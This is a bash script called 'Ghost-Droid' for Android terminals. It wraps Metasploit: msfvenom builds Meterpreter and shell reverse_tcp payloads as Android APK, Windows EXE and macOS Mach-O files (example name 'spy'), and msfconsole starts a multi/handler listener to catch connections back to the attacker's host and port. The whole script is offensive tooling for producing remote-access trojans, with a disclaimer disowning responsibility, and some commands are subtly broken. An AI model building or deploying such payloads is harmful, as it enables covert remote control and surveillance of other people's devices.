# Created by Harsh Mishra

# Tool : Ghost-Droid

# Do not copy or try to modify the codes.   License included 

# YT channel : https://www.youtube.com/channel/UCCB3ApWZfL3E7yHF6gESX9g


# Now Generate payload in Android.

# I am and my tool will not responsible for any of your action

re='\e[1;31m'
white='\e[1;37m'
blue='\e[1;34m'
Escape="\033";
ref="${Escape}[31m";
gf="${Escape}[32m";
lgf="${Escape}[92m"
yf="${Escape}[33m";
bf="${Escape}[34m";
cf="${Escape}[36m";
ee="${Escape}[0m";
pu='\033[1;35m'
cy='\e[0;36m'
lg='\e[1;32m'
ye='\e[1;33m'
ver=v0.1


function banner(){

clear
echo -e $ye " "
echo -e "                      @"
echo -e "          ${re}           @ @     @"

echo -e "                @   @   @ ${ye}  @ @   "
echo -e "           ${re}    @ @  @${ye}   @  @ ${re}  @  "  
echo -e "              @  @ @     @ @    @ "  
echo -e "           ${ye}  @    @      ${re} @      @  "
echo -e "        ${ye}    @                     @"
echo -e "           @    ${lg}   jggggggggb.  ${ye}   @"
echo -e "          @    ${lg}   gg        gg   ${ye}   @"
echo -e "         @    ${lg}   gg              ${ye}    @  " 
echo -e "        @    ${lg}   gg                 ${ye}   @"
echo -e "       @      ${lg} gg                    ${ye}  @"
echo -e "       @      ${lg} GG         kkkk      ${ye}   @"
echo -e "        @      ${lg}hh           pp     ${ye}   @"
echo -e "         @     ${lg} oo          hh     ${ye}  @"
echo -e "          @      ${lg}ss         GG  ${ye}    @  "
echo -e "  ${ye}         @      ${lg}TTmmaaNHNkk*   ${ye}  @"
echo -e "   ${ye}        @                       @"
echo -e "           @                       @"
echo -e "           @@@@@@@@@@@@@@@@@@@@@@@@@"
echo -e "     ${ye}      |  ${re}    (GhosTmaN)     ${ye}  |"
echo -e "   $ye        | ${cy}Author : ${bf}Harsh Mishra ${ye}|   ${ye} $ver "
echo -e "           ${ye}|-----------------------|"
echo -e "     ${ye}      |    ${lg}  Ghost-Droid   ${ye}   |"
echo -n  -e "     ${ye}      @@@@@@@@@@@@@@@@@@@@@@@@@"
read gar
}

function checkinternet(){

clear
figlet -f smmono9 "Ghost-Droid" | lolcat
echo -e $lg " [¥] Checking your Internet Connection "
echo " "
ping -c 1 google.com > /dev/null 2>&1
if [[ "$?" != 0 ]]
 then
    echo -e $ye " [-] Checking For Internet:${re} FAILED"
    echo ""
    echo -e $lgf " This Script Needs An Active Internet Connection"
    echo ""
    echo -e $ye "                Ghost-Droid Exit" 
    echo ""
    sleep 2
    exip
    echo "" | lolcat
    exit
  else
    echo -e $ye " [√] Checking For Internet:${lg} CONNECTED"
    sleep 2
  fi

}

function start(){

clear
echo " " 
echo " " 
echo " "
echo -e $ye "|----------------------------------------|"
echo -e $ye "| ${re}Don't copy or try to modify the codes${ye}  |"
echo -e	$ye "|----------------------------------------|" " 
echo -e $ye " Me or my tool is not responsible for any of your action " 
echo " " 
echo " " 
figlet -f mono9 " Ghost"
figlet -f mono9 " Droid" 
sleep 2

}
function server(){

clear
echo -e $blue " [${ye}∆${blue}] Setting up the Server........."
initdb $PREFIX/var/lib/postgresql > /dev/null 2>&1 
pg_ctl -D $PREFIX/var/lib/postgresql start > /dev/null 2>&1
echo ""
echo ""                                
echo -e $lgf " [${re}S${lgf}] Server has been Started "
sleep 2

}

function exip(){

echo -e $cy "   +----------------------------------------+"
echo -e $cy "   |     ${ye}Thanks for using Ghost-Droid       ${cy}|"
echo -e $cy "   |        ${ye}See you at next time            ${cy}|"
echo -e $cy "   |----------------------------------------|"
echo -e $cy "   |           ${lg}Bye Bye ( ^_^)/              ${cy}|"
echo -e $cy "   +----------------------------------------+"
echo ""
echo "." | lolcat
sleep 1
exit

}

function lhost(){

echo -e $lg " Enter Local Host(your inet IP or public IP "
echo -n -e $ye " [H]: "
read lhost

}
function lport(){

echo -e $lg " Assign Local Port (ex:4444) "
echo -n -e $ye " [P]: "
read lport

}
function pname(){

echo -n -e $lg " [N] Assign a name(ex: spy) :> ${ye}"
read name

}

function listener(){

msfconsole -x 'use multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD android/meterpreter/reverse_tcp; exploit'

}


function android(){

clear
figlet -f pagga " Ghost-Droid " | lolcat
echo "--------------[ Generate Payload ]---------------"
echo ""
lhost
echo " "
lport
echo " "
echo ""
pname
echo ""
echo " [@] This could take a while........." 
echo " "
msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport --platform android R -o /sdcard/ghost/$name.apk > /dev/null 2>&1
echo " Generated payload is saved in ghost directory "
ls /sdcard/ghost | cat -n 
returu

}

function windows(){

clear
figlet -f pagga " Ghost-Droid " | lolcat
echo "--------------[ Generate Payload ]---------------"
echo ""
lhost
lport
pname
echo ""
echo " This could take a while........."
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe > /sdcard/ghost/$name.exe > /dev/null 2>&1
echo ""
echo " Your payload has been saved in your sdcard in the ghost directory "
echo ""
ls /sdcard/ghost | cat -n
returu

}

function mac(){

clear
figlet -f pagga " Ghost-Droid " | lolcat
echo "--------------[ Generate Payload ]---------------"
echo ""
lhost
lport
pname
echo ""
echo -e $ye " This could take a while......."
msfvenom -p osx/x86/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f macho > /sdcard/ghost/$name.macho > /dev/null 2>&1 
echo ""
echo -e $re " Your payload has been saved in your sdcard in the ghost directory "
echo -e $ye ""
ls /sdcard/ghost | cat -n

}

function returu(){

echo -e $cy "   +------------[ ${ye}Ghost-Droid${cy} ]-------------+"
echo -e $cy "   | ${pu}[${re}1${pu}] ${ye}Main-menu                          ${cy}|"
echo -e $cy "   | ${pu}[${re}2${pu}] ${ye}Exit                               ${cy}|"
echo -e $cy "   +----------------------------------------+"
echo -n -e $cy "Ghost:> "
read f
case $f in
      1) main_menu
      ;;
      2) exip
      ;;
      *) clear 
         echo " [-] Invalid Input "
         returu
      ;;
esac

}

function menu(){

clear
echo -e $ye "   +------------{ ${ref}Payload Menu ${ye}}------------+"
echo -e $ye "   |                                        |"
echo -e $ye "   | ${bf}[${lg}01${bf}] ${re}Payload for Android               ${ye}|"
echo -e $ye "   | ${bf}[${lg}02${bf}] ${re}Payload for Windows               ${ye}|"
echo -e $ye "   | ${bf}[${lg}03${bf}] ${re}Payload for MacOs                 ${ye}|"
echo -e $ye "   | ${bf}[${lg}04${bf}] ${re}Back                              ${ye}|"
echo -e $ye "   |----------------------------------------|"
echo -n "type:> "
read type
case $type in
      1) android
      ;;
      2) windows
      ;;
      3) mac
      ;;
      4) main_menu
      ;;
      *) echo " [-] Invalid Input "
         echo " [^] Press enter to continue........"
         read zz
         menu
      ;;
esac

}

function remove(){

    echo -e $ye ""
    echo " This Module will delete all the files present in "
    echo -e $re " ghost${ye} directory of your sdcard "
    echo " "
    echo -e $cy " [=] Your Files "
    ls /sdcard/ghost | cat -n 
    echo -n -e $lg " Do you want to continue (y/n):"
        read gok
        if [ $gok == 'y' ]
         then
            cd /sdcard/ghost
            rm *
            cd $HOME
         elif [ $gok == 'n' ]
          then
            main_menu
         else
            echo -e $ye"          Invalid Input "
            remove
        fi
   
}

function main_menu(){

clear
echo -e $lgf "  __________________________________________"
echo -e $lgf "  |${ref}========================================${lgf}|"
echo -e $lgf "  |${ref}========[ ${ye}Ghost-Droid${ref} ]=================${lgf}|"
echo -e $lgf "  |${ref}===========================[ ${ye}$ver ${ref}]=====${lgf}|"
echo -e $lg "  |${ref}========================================${lgf}|"
echo -e $lgf "  |              ${blue}[Main Menu]               ${lgf}|"
echo -e $lgf "  |${gf}----------------------------------------${lgf}|"
echo -e $lgf "  | ${re}[${ye}1${re}] ${ye}Generate Payload                   ${lgf}|"
echo -e $lgf "  | ${re}[${ye}2${re}] ${ye}Start Listener                     ${lgf}|"
echo -e $lgf "  | ${re}[${ye}3${re}] ${ye}Inject Loop                        ${lgf}|"
echo -e $lgf "  | ${re}[${ye}c${re}] ${ye}Clear Directory                    ${lgf}|"
echo -e $lgf "  | ${re}[${ye}e${re}] ${ye}Exit                               ${lgf}|"
echo -e $lgf "  |${gf}________________________________________${lgf}|"
echo -e $cy " "
echo -e -n " Ghost:> ${ye}"
read cho
case $cho in
     1) clear
        menu
        returu
     ;;
     2) clear
        lhost
        lport
        listener
        returu
     ;;
     3) echo ""
        echo " Wait for Version 1.1"
        returu
     ;;
     c) clear
        remove
        returu
     ;;
     e) echo " "
        exip
     ;;
     *) figlet -f big "      Invalid" | lolcat
        figlet -f big "         Input" | lolcat
        echo -n " Press enter to continue......" | lolcat
        read s
        main_menu
     ;;
esac

}
start
checkinternet
server
banner
main_menu